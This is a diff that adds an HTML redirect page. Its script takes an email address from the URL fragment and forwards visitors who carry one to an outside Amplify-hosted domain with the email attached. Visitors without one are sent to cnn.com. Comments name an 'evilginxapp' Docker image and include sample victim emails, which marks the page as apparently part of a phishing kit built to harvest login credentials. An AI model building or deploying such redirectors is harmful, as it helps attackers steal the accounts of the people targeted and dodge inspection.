@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Redirrecting......</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+</head>
+<body>
+
+<script>
+
+var emailID = ' ';
+
+//  'd2lsc29uQHdpbG9zbm1vbmFjby5jb20='
+
+// function b64DecodeUnicode(str) {
+//   // Going backwards: from bytestream, to percent-encoding, to original string.
+//   return decodeURIComponent(atob(str).split('').map(function(c) {
+//       return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+//   }).join(''));
+// }
+
+
+function redirrectPage(){
+  var query = window.location.href;
+  console.log(query);
+  var res = query.split("#");
+  var data1 = res[0];
+  var data2 = res[1];
+  console.log(data1);
+  console.log(data2);
+
+  // realemailID = b64DecodeUnicode(data2);        https://hookmist.com/#wilson@mmm.com
+  // console.log(realemailID);
+
+  if (data2)
+  {
+    console.log("true");
+      window.location.href = "https://sharemanh.d3bpr0p3dian5p.amplifyapp.com#" + data2;
+  }else{
+    console.log("false");
+    window.location.href = "https://www.cnn.com";
+  }
+}
+
+redirrectPage();
+
+//  file:///Users/WILSON/Desktop/ALL%20PAGES/redirrectnew/index.html#wilosn@yahoo.com
+
+
+
+// docker commit 0dfe64eba151  mrcew/evilginxapp:withall2
+
+</script>
+</body>
+</html>
